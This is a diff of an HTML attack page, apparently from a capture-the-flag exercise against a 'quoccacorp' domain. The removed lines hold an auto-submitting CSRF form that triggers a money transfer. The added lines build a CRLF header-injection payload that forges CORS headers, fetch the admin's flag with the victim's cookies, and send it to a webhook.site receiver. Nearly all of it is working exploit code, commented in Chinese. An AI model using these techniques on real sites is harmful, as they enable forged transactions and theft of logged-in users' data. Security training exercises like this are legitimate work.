@@ -1,18 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Transfering...</title>
-</head>
 <body>
-    <form id="csrf-form" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
-        <input type="hidden" name="csrf_token" value="NTUzMg==">
-        
-        <input type="hidden" name="username" value="z5625996">
-        <input type="hidden" name="amount" value="1000">
-    </form>
+    <h1>Fetching Flag...</h1>
     <script>
-        // 页面加载后立即自动提交
-        document.getElementById('csrf-form').submit();
+        // 1. 替换为你托管此代码的实际 Origin
+        const attackerOrigin = "https://attacker.com"; 
+        
+        // 2. 准备 CRLF 注入的 Payload
+        const payload = `ALLOW-FROM ${attackerOrigin}\r\nAccess-Control-Allow-Origin: ${attackerOrigin}\r\nAccess-Control-Allow-Credentials: true`;
+        
+        // 3. 构造最终目标 URL
+        const targetUrl = `https://qb5-api.final.quoccacorp.com/flag?framing=${encodeURIComponent(payload)}`;
+
+        // 4. 发起带有 Admin Cookie 的跨域请求
+        fetch(targetUrl, {
+            method: 'GET',
+            credentials: 'include' // 必须包含这个，确保带上管理员的 Session/Cookie
+        })
+        .then(response => response.text())
+        .then(flagData => {
+            // 5. 将获取到的 Flag 发送到你的 Webhook 接收器
+            // 请将下面的 URL 替换为你自己的 webhook.site 地址
+            fetch("https://webhook.site/YOUR-WEBHOOK-ID?flag=" + btoa(flagData));
+        })
+        .catch(err => console.error("Error:", err));
     </script>
 </body>
 </html>
